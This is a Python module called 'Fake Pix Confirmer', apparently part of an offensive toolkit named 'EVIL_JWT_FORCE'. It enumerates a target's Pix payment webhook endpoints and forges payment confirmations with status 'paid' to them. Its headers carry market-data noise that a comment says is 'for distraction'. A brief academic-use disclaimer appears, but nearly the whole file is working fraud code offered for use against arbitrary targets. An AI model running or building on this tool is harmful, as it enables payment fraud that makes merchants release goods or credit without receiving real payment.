#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Fake Pix Confirmer - módulo para simular webhooks falsos de confirmação de pagamento via endpoints vulneráveis.
Uso acadêmico/ético: Não executar em ambientes não autorizados.
"""
import os
import sys
import json
import time
from pathlib import Path
from datetime import datetime
import requests
import logging
from utils.logger import get_logger
from utils.emv_parser import parse_emv
from modules.api_clients.external_data_api import MarketStackAPI, FixerAPI

# Logger específico para Fake Pix
logger = get_logger("EVIL_JWT_FORCE.fake_pix")

class FakePixConfirmer:
    @staticmethod
    def parse_emv_payload(payload_str: str) -> dict:
        """Parse EMVCo copy-paste payload and extract txid, chave, valor, merchant_name."""
        try:
            return parse_emv(payload_str)
        except Exception as e:
            logger.error(f"Erro ao parsear payload EMV: {e}")
            return {}

    def __init__(self, base_url=None, jwt_token=None, user_id=None, amount=None):
        # EMV data parsed from payload (if any)
        self.emv_data = {}
        self.base_url = base_url or ""
        self.jwt_token = jwt_token or ""
        self.user_id = user_id or ""
        self.amount = amount or ""
        # If EMV payload provided, override fields with real data
        # emv_payload may be passed via kwargs in CLI integration
        emv_payload = getattr(self, 'emv_payload', None)
        if emv_payload:
            try:
                self.emv_data = parse_emv(emv_payload)
                # Override with parsed values
                self.txid = self.emv_data.get('txid')
                self.jwt_token = self.emv_data.get('chave', self.jwt_token)
                self.user_id = self.emv_data.get('merchant', self.user_id)
                self.amount = self.emv_data.get('valor', self.amount)
            except Exception as e:
                logger.error(f"Falha ao parsear EMV payload: {e}")
        # Diretório para logs de pix
        self.log_dir = Path(__file__).resolve().parent.parent / "output" / "pix_logs"
        self.log_dir.mkdir(parents=True, exist_ok=True)

    @staticmethod
    def enumerate_endpoints(base_url: str):
        """Enumera endpoints listados em config/pix_endpoints.txt que respondem a uma requisição OPTIONS ou GET."""
        endpoints = []
        cfg = Path(__file__).resolve().parent.parent / "config" / "pix_endpoints.txt"
        if not cfg.exists():
            logger.warning(f"Arquivo de endpoints não encontrado: {cfg}")
            return endpoints
        for line in cfg.read_text(encoding="utf-8").splitlines():
            ep = line.strip()
            if not ep:
                continue
            url = base_url.rstrip("/") + ep
            try:
                r = requests.options(url, timeout=5)
                if r.status_code < 400:
                    endpoints.append(ep)
                    continue
                r2 = requests.get(url, timeout=5)
                if r2.status_code < 400:
                    endpoints.append(ep)
            except Exception as e:
                logger.debug(f"Teste de endpoint {url} falhou: {e}")
        logger.info(f"Endpoints disponíveis: {endpoints}")
        return endpoints

    def forge_webhook(self, endpoint: str):
        """Forja e envia um webhook de pagamento falso com status 'paid'."""
        url = self.base_url.rstrip("/") + endpoint
        # Build payload: use EMV data if available
        if self.emv_data:
            payload = {
                "txid": getattr(self, 'txid', None),
                "chave": self.emv_data.get('chave'),
                "valor": self.emv_data.get('valor'),
                "merchant_name": self.emv_data.get('merchant'),
                "status": "paid"
            }
        else:
            payload = {
                "jwt": self.jwt_token,
                "user_id": self.user_id,
                "amount": self.amount,
                "status": "paid"
            }
        # Ruídos de mercado e câmbio para distração
        stock_data = MarketStackAPI.get_stock('AAPL').get('data', [])
        close_price = stock_data[0].get('close') if stock_data else None
        fx_info = FixerAPI.get_conversion('USD', 'EUR').get('info', {})
        fx_rate = fx_info.get('rate')
        # Cabeçalhos com ruído
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Evil-JWT-Force",
            "X-Stock-Price": str(close_price),
            "X-FX-Rate": str(fx_rate)
        }
        try:
            resp = requests.post(url, json=payload, headers=headers, timeout=10)
            logger.info(f"POST {url} -> {resp.status_code}")
            self.log_result(endpoint, payload, resp)
            return resp
        except Exception as e:
            logger.error(f"Erro ao forjar webhook {url}: {e}")
            return None

    def log_result(self, endpoint: str, payload: dict, response):
        """Salva detalhes da requisição e resposta num arquivo JSON em output/pix_logs."""
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = self.log_dir / f"fakepix_{ts}.json"
        try:
            data = {
                "endpoint": endpoint,
                "payload": payload,
                "status_code": response.status_code if response else None,
                "headers": dict(response.headers) if response else {},
                "body": response.text if response else "",
                "timestamp": ts
            }
            with open(filename, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
            logger.info(f"Log salvo em {filename}")
        except Exception as e:
            logger.error(f"Falha ao salvar log {filename}: {e}")

    def run(self):
        """Fluxo CLI: coleta inputs, enumera endpoints e forja webhooks."""
        print("=== Fake Pix Confirmer ===")
        if not self.base_url:
            self.base_url = input("URL base (ex: https://target.com): ").strip()
        if not self.jwt_token:
            self.jwt_token = input("JWT Token: ").strip()
        if not self.user_id:
            self.user_id = input("User ID: ").strip()
        if not self.amount:
            self.amount = input("Valor (ex: 100.00): ").strip()
        endpoints = self.enumerate_endpoints(self.base_url)
        print("Endpoints encontrados:", endpoints)
        for ep in endpoints:
            resp = self.forge_webhook(ep)
            code = resp.status_code if resp else "Erro"
            print(f"[{code}] {self.base_url.rstrip('/') + ep}")
            time.sleep(1)

    @staticmethod
    def run_from_cli():
        """Ponto de entrada para CLI."""
        conf = FakePixConfirmer()
        conf.run()

    @staticmethod
    def run_gui(base_url, jwt_token, user_id, amount, endpoint=None):
        """Fluxo de integração com GUI: retorna lista de resultados."""
        inst = FakePixConfirmer(base_url, jwt_token, user_id, amount)
        targets = [endpoint] if endpoint else inst.enumerate_endpoints(base_url)
        results = []
        for ep in targets:
            resp = inst.forge_webhook(ep)
            results.append({
                "endpoint": ep,
                "status_code": resp.status_code if resp else None,
                "body": resp.text if resp else ""
            })
        return results

def build_payload(payer_name, cpf, value, txid, timestamp, copy_paste_code) -> dict:
    """Build JSON payload for fake PIX webhook."""
    if not payer_name or not cpf or not value or not txid:
        raise ValueError("Campos obrigatórios faltando")
    return {
        "payer_name": payer_name,
        "payer_document": cpf,
        "amount": value,
        "txid": txid,
        "timestamp": timestamp,
        "code": copy_paste_code
    }

def send_webhook(payload: dict, url: str) -> (bool, str):
    """Send the payload to the webhook URL and return (success, message)."""
    headers = {"Content-Type": "application/json", "User-Agent": "Evil-JWT-Force"}
    try:
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        if 200 <= resp.status_code < 300:
            return True, str(resp.status_code)
        return False, f"HTTP {resp.status_code}"
    except Exception as e:
        return False, str(e)

def save_payload(payload: dict, path: str = "output/fake_pix_payload.json") -> bool:
    """Save the payload to a JSON file."""
    try:
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as f:
            json.dump(payload, f, ensure_ascii=False, indent=2)
        return True
    except Exception as e:
        logger.error(f"Erro ao salvar payload: {e}")
        return False

if __name__ == "__main__":
    FakePixConfirmer.run_from_cli() 